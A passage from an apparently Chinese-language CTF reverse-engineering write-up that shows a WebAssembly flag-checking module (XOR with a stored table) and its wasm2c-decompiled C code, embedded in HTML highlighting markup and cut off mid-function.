class="line">43</span><br></pre></td><td class="code"><pre><span class="line">(module</span><br><span class="line">  (type $t0 (func (result i32)))</span><br><span class="line">  (type $t1 (func (param i32) (result i32)))</span><br><span class="line">  (func $get_buf (export &quot;get_buf&quot;) (type $t0) (result i32)</span><br><span class="line">    (i32.const 80))</span><br><span class="line">  (func $check_flag (export &quot;check_flag&quot;) (type $t1) (param $p0 i32) (result i32)</span><br><span class="line">    (local $l1 i32) (local $l2 i32)</span><br><span class="line">    (local.set $l1</span><br><span class="line">      (i32.const 0))</span><br><span class="line">    (local.set $l2</span><br><span class="line">      (i32.const 0))</span><br><span class="line">    (loop $L0</span><br><span class="line">      (local.set $l1</span><br><span class="line">        (i32.or</span><br><span class="line">          (i32.xor</span><br><span class="line">            (i32.shr_s</span><br><span class="line">              (i32.shl</span><br><span class="line">                (i32.xor</span><br><span class="line">                  (i32.load8_u</span><br><span class="line">                    (i32.add</span><br><span class="line">                      (local.get $p0)</span><br><span class="line">                      (local.get $l2)))</span><br><span class="line">                  (i32.load8_u</span><br><span class="line">                    (i32.add</span><br><span class="line">                      (local.get $l2)</span><br><span class="line">                      (i32.const 16))))</span><br><span class="line">                (i32.const 24))</span><br><span class="line">              (i32.const 24))</span><br><span class="line">            (i32.const 66))</span><br><span class="line">          (local.get $l1)))</span><br><span class="line">      (br_if $L0</span><br><span class="line">        (i32.ne</span><br><span class="line">          (local.tee $l2</span><br><span class="line">            (i32.add</span><br><span class="line">              (local.get $l2)</span><br><span class="line">              (i32.const 1)))</span><br><span class="line">          (i32.const 23))))</span><br><span class="line">    (i32.eqz</span><br><span class="line">      (local.get $l1)))</span><br><span class="line">  (table $T0 0 funcref)</span><br><span class="line">  (memory $memory (export &quot;memory&quot;) 1)</span><br><span class="line">  (data $d0 (i32.const 16) &quot;$.#%9\0a&#39;..-\15&#39; \0311&#39;&#x2F; .;?B&quot;)</span><br><span class="line">  (data $d1 (i32.const 48) &quot;flag&#123;ThisFlagIsFake&#125;\00&quot;))</span><br></pre></td></tr></table></figure><p>直接看反汇编代码还是有点复杂，可以进一步将其反编译为C代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __FLAG_H_GENERATED_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __FLAG_H_GENERATED_</span></span><br><span class="line"><span class="comment">/* Automically generated by wasm2c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;wasm-rt.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> WASM_RT_MODULE_PREFIX</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WASM_RT_MODULE_PREFIX</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WASM_RT_PASTE_(x, y) x ## y</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WASM_RT_PASTE(x, y) WASM_RT_PASTE_(x, y)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WASM_RT_ADD_PREFIX(x) WASM_RT_PASTE(WASM_RT_MODULE_PREFIX, x)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* TODO(binji): only use stdint.h types in header */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint8_t</span> u8;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int8_t</span> s8;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint16_t</span> u16;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int16_t</span> s16;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> u32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int32_t</span> s32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> u64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int64_t</span> s64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">float</span> f32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">double</span> f64;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">WASM_RT_ADD_PREFIX</span><span class="params">(init)</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* export: &#x27;memory&#x27; */</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="title">wasm_rt_memory_t</span> <span class="params">(*WASM_RT_ADD_PREFIX(Z_memory))</span></span>;</span><br><span class="line"><span class="comment">/* export: &#x27;get_buf&#x27; */</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="title">u32</span> <span class="params">(*WASM_RT_ADD_PREFIX(Z_get_bufZ_iv))</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="comment">/* export: &#x27;check_flag&#x27; */</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="title">u32</span> <span class="params">(*WASM_RT_ADD_PREFIX(Z_check_flagZ_ii))</span><span class="params">(u32)</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* __FLAG_H_GENERATED_ */</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.c</span></span><br><span class="line"><span class="comment">/* Automically generated by wasm2c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;./flag.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UNLIKELY(x) __builtin_expect(!!(x), 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LIKELY(x) __builtin_expect(!!(x), 1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRAP(x) (wasm_rt_trap(WASM_RT_TRAP_##x), 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FUNC_PROLOGUE                                            \</span></span><br><span class="line">  <span class="keyword">if</span> (++wasm_rt_call_stack_depth &gt; WASM_RT_MAX_CALL_STACK_DEPTH) \</span><br><span class="line">    TRAP(EXHAUSTION)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FUNC_EPILOGUE --wasm_rt_call_stack_depth</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UNREACHABLE TRAP(UNREACHABLE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CALL_INDIRECT(table, t, ft, x, ...)          \</span></span><br><span class="line">  (LIKELY((x) &lt; table.size &amp;&amp; table.data[x].func &amp;&amp;  \</span><br><span class="line">          table.data[x].func_type == func_types[ft]) \</span><br><span class="line">       ? ((t)table.data[x].func)(__VA_ARGS__)        \</span><br><span class="line">       : TRAP(CALL_INDIRECT))</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> WASM_RT_MEMCHECK_SIGNAL_HANDLER</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MEMCHECK(mem, a, t)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MEMCHECK(mem, a, t)  \</span></span><br><span class="line">  <span class="keyword">if</span> (UNLIKELY((a) + <span class="keyword">sizeof</span>(t) &gt; mem-&gt;size)) TRAP(OOB)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFINE_LOAD(name, t1, t2, t3)                        \</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> t3 <span class="title">name</span><span class="params">(<span class="keyword">wasm_rt_memory_t</span>* mem, u64 addr)</span> </span>&#123;   \</span><br><span class="line">    MEMCHECK(mem, addr, t1);                                 \</span><br><span class="line">    t1 result;                                               \</span><br><span class="line">    __builtin_memcpy(&amp;result, &amp;mem-&gt;data[addr], <span class="keyword">sizeof</span>(t1)); \</span><br><span class="line">    <span class="keyword">return</span> (t3)(t2)result;                                   \</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFINE_STORE(name, t1, t2)                                     \</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">name</span><span class="params">(<span class="keyword">wasm_rt_memory_t</span>* mem, u64 addr, t2 value)</span> </span>&#123; \</span><br><span class="line">    MEMCHECK(mem, addr, t1);                                           \</span><br><span class="line">    t1 wrapped = (t1)value;                                            \</span><br><span class="line">    __builtin_memcpy(&amp;mem-&gt;data[addr], &amp;wrapped, <span class="keyword">sizeof</span>(t1));          \</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">DEFINE_LOAD(i32_load, u32, u32, u32);</span><br><span class="line">DEFINE_LOAD(i64_load, u64, u64, u64);</span><br><span class="line">DEFINE_LOAD(f32_load, f32, f32, f32);</span><br><span class="line">DEFINE_LOAD(f64_load, f64, f64, f64);</span><br><span class="line">DEFINE_LOAD(i32_load8_s, s8, s32, u32);</span><br><span class="line">DEFINE_LOAD(i64_load8_s, s8, s64, u64);</span><br><span class="line">DEFINE_LOAD(i32_load8_u, u8, u32, u32);</span><br><span class="line">DEFINE_LOAD(i64_load8_u, u8, u64, u64);</span><br><span class="line">DEFINE_LOAD(i32_load16_s, s16, s32, u32);</span><br><span class="line">DEFINE_LOAD(i64_load16_s, s16, s64, u64);</span><br><span class="line">DEFINE_LOAD(i32_load16_u, u16, u32, u32);</span><br><span class="line">DEFINE_LOAD(i64_load16_u, u16, u64, u64);</span><br><span class="line">DEFINE_LOAD(i64_load32_s, s32, s64, u64);</span><br><span class="line">DEFINE_LOAD(i64_load32_u, u32, u64, u64);</span><br><span class="line">DEFINE_STORE(i32_store, u32, u32);</span><br><span class="line">DEFINE_STORE(i64_store, u64, u64);</span><br><span class="line">DEFINE_STORE(f32_store, f32, f32);</span><br><span class="line">DEFINE_STORE(f64_store, f64, f64);</span><br><span class="line">DEFINE_STORE(i32_store8, u8, u32);</span><br><span class="line">DEFINE_STORE(i32_store16, u16, u32);</span><br><span class="line">DEFINE_STORE(i64_store8, u8, u64);</span><br><span class="line">DEFINE_STORE(i64_store16, u16, u64);</span><br><span class="line">DEFINE_STORE(i64_store32, u32, u64);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I32_CLZ(x) ((x) ? __builtin_clz(x) : 32)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I64_CLZ(x) ((x) ? __builtin_clzll(x) : 64)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I32_CTZ(x) ((x) ? __builtin_ctz(x) : 32)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I64_CTZ(x) ((x) ? __builtin_ctzll(x) : 64)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I32_POPCNT(x) (__builtin_popcount(x))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I64_POPCNT(x) (__builtin_popcountll(x))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DIV_S(ut, min, x, y)                                 \</span></span><br><span class="line">   ((UNLIKELY((y) == <span class="number">0</span>)) ?                TRAP(DIV_BY_ZERO)  \</span><br><span class="line">  : (UNLIKELY((x) == min &amp;&amp; (y) == <span class="number">-1</span>)) ? TRAP(INT_OVERFLOW) \</span><br><span class="line">  : (ut)((x) / (y)))</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REM_S(ut, min, x, y)                                \</span></span><br><span class="line">   ((UNLIKELY((y) == <span class="number">0</span>)) ?                TRAP(DIV_BY_ZERO) \</span><br><span class="line">  : (UNLIKELY((x) == min &amp;&amp; (y) == <span class="number">-1</span>)) ? <span class="number">0</span>                 \</span><br><span class="line">  : (ut)((x) % (y)))</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I32_DIV_S(x, y) DIV_S(u32, INT32_MIN, (s32)x, (s32)y)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I64_DIV_S(x, y) DIV_S(u64, INT64_MIN, (s64)x, (s64)y)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I32_REM_S(x, y) REM_S(u32, INT32_MIN, (s32)x, (s32)y)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I64_REM_S(x, y) REM_S(u64, INT64_MIN, (s64)x, (s64)y)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DIVREM_U(op, x, y) \</span></span><br><span class="line">  ((UNLIKELY((y) == <span class="number">0</span>)) ? TRAP(DIV_BY_ZERO) : ((x) op (y)))</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DIV_U(x, y) DIVREM_U(/, x, y)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REM_U(x, y) DIVREM_U(%, x, y)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROTL(x, y, mask) \</span></span><br><span class="line">  (((x) &lt;&lt; ((y) &amp; (mask))) | ((x) &gt;&gt; (((mask) - (y) + <span class="number">1</span>) &amp; (mask))))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROTR(x, y, mask) \</span></span><br><span class="line">  (((x) &gt;&gt; ((y) &amp; (mask))) | ((x) &lt;&lt; (((mask) - (y) + <span class="number">1</span>) &amp; (mask))))</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I32_ROTL(x, y) ROTL(x, y, 31)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I64_ROTL(x, y) ROTL(x, y, 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I32_ROTR(x, y) ROTR(x, y, 31)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I64_ROTR(x, y) ROTR(x, y, 63)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FMIN(x, y)                                          \</span></span><br><span class="line">   ((UNLIKELY((x) != (x))) ? NAN                            \</span><br><span class="line">  : (UNLIKELY((y) != (y))) ? NAN                            \</span><br><span class="line">  : (UNLIKELY((x) == <span class="number">0</span> &amp;&amp; (y) == <span class="number">0</span>)) ? (signbit(x) ? x : y) \</span><br><span class="line">  : (x &lt; y) ? x : y)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FMAX(x, y)                                          \</span></span><br><span class="line">   ((UNLIKELY((x) != (x))) ? NAN                            \</span><br><span class="line">  : (UNLIKELY((y) != (y))) ? NAN                            \</span><br><span class="line">  : (UNLIKELY((x) == <span class="number">0</span> &amp;&amp; (y) == <span class="number">0</span>)) ? (signbit(x) ? y : x) \</span><br><span class="line">  : (x &gt; y) ? x : y)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRUNC_S(ut, st, ft, min, minop, max, x)                             \</span></span><br><span class="line">  ((UNLIKELY((x) != (x)))                        ? TRAP(INVALID_CONVERSION) \</span><br><span class="line">   : (UNLIKELY(!((x)minop(min) &amp;&amp; (x) &lt; (max)))) ? TRAP(INT_OVERFLOW)       \</span><br><span class="line">                                                 : (ut)(st)(x))</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I32_TRUNC_S_F32(x) TRUNC_S(u32, s32, f32, (f32)INT32_MIN, &gt;=, 2147483648.f, x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I64_TRUNC_S_F32(x) TRUNC_S(u64, s64, f32, (f32)INT64_MIN, &gt;=, (f32)INT64_MAX, x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I32_TRUNC_S_F64(x) TRUNC_S(u32, s32, f64, -2147483649., &gt;, 2147483648., x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I64_TRUNC_S_F64(x) TRUNC_S(u64, s64, f64, (f64)INT64_MIN, &gt;=, (f64)INT64_MAX, x)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRUNC_U(ut, ft, max, x)                                            \</span></span><br><span class="line">  ((UNLIKELY((x) != (x)))                       ? TRAP(INVALID_CONVERSION) \</span><br><span class="line">   : (UNLIKELY(!((x) &gt; (ft)<span class="number">-1</span> &amp;&amp; (x) &lt; (max)))) ? TRAP(INT_OVERFLOW)       \</span><br><span class="line">                                                : (ut)(x))</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I32_TRUNC_U_F32(x) TRUNC_U(u32, f32, 4294967296.f, x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I64_TRUNC_U_F32(x) TRUNC_U(u64, f32, (f32)UINT64_MAX, x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I32_TRUNC_U_F64(x) TRUNC_U(u32, f64, 4294967296.,  x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I64_TRUNC_U_F64(x) TRUNC_U(u64, f64, (f64)UINT64_MAX, x)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFINE_REINTERPRET(name, t1, t2)  \</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> t2 <span class="title">name</span><span class="params">(t1 x)</span> </span>&#123;           \</span><br><span class="line">    t2 result;                            \</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;result, &amp;x, <span class="keyword">sizeof</span>(result));  \</span><br><span class="line">    <span class="keyword">return</span> result;                        \</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">DEFINE_REINTERPRET(f32_reinterpret_i32, u32, f32)</span><br><span class="line">DEFINE_REINTERPRET(i32_reinterpret_f32, f32, u32)</span><br><span class="line">DEFINE_REINTERPRET(f64_reinterpret_i64, u64, f64)</span><br><span class="line">DEFINE_REINTERPRET(i64_reinterpret_f64, f64, u64)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> u32 func_types[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">init_func_types</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  func_types[<span class="number">0</span>] = wasm_rt_register_func_type(<span class="number">0</span>, <span class="number">1</span>, WASM_RT_I32);</span><br><span class="line">  func_types[<span class="number">1</span>] = wasm_rt_register_func_type(<span class="number">1</span>, <span class="number">1</span>, WASM_RT_I32, WASM_RT_I32);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> u32 <span class="title">w2c_get_buf</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> u32 <span class="title">w2c_check_flag</span><span class="params">(u32)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">init_globals</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">wasm_rt_memory_t</span> w2c_memory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">wasm_rt_table_t</span> w2c_T0;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> u32 <span class="title">w2c_get_buf</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  FUNC_PROLOGUE;</span><br><span class="line">  u32 w2c_i0;</span><br><span class="line">  w2c_i0 = <span class="number">80u</span>;</span><br><span class="line">  FUNC_EPILOGUE;</span><br><span class="line">  <span class="keyword">return</span> w2c_i0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> u32 <span class="title">w2c_check_flag</span><span class="params">(u32 w2c_p0)</span> </span>&#123;</span><br><span class="line">  u32 w2c_l1 = <span class="number">0</span>, w2c_l2 = <span class="number">0</span>;</span><br><span class="line">  FUNC_PROLOGUE;</span><br><span class="line">  u32 w2c_i0, w2c_i1, w2c_i2;</span><br><span class="line">  w2c_i0 = <span class="number">0u</span>;</span><br><span class="line">  w2c_l1 = w2c_i0;</span><br><span class="line">  w2c_i0 = <span class="number">0u</span>;</span><br><span class="line">  w2c_l2 = w2c_i0;</span><br><span class="line">  w2c_L0: </span><br><span class="line">    w2c_i0 = w2c_p0;</span><br><span class="line">    w2c_i1 = w2c_l2;</span><br><span class="line">    w2c_i0 += w2c_i1;</span><br><span class="line">    w2c_i0 = i32_load8_u((&amp;w2c_memory), (u64)(w2c_i0));</span><br><span class="line">    w2c_i1 = w2c_l2;</span><br><span class="line">    w2c_i2 = <span class="number">16u</span>;</span><br><span class="line">    w2c_i1 += w2c_i2;</span><br><span class="line">    w2c_i1 = i32_load8_u((&amp;w2c_memory), (u64)(w2c_i1));</span><br><span class="line">    w2c_i0 ^= w2c_i1;</span><br><span class="line">    w2c_i1 = <span class="number">24u</span>;</span><br><span class="line">    w2c_i0 &lt;&lt;= (w2c_i1 &amp; <span class="number">31</span>);</span><br><span class="line">    w2c_i1 = <span class="number">24u</span>;</span><br><span class="line">    w2c_i0 = (u32)((s32)w2c_i0 &gt;&gt; (w2c_i1 &amp; <span class="number">31</span>));</span><br><span class="line">    w2c_i1 = <span class="number">66u</span>;</span><br><span class="line">    w2c_i0 ^= 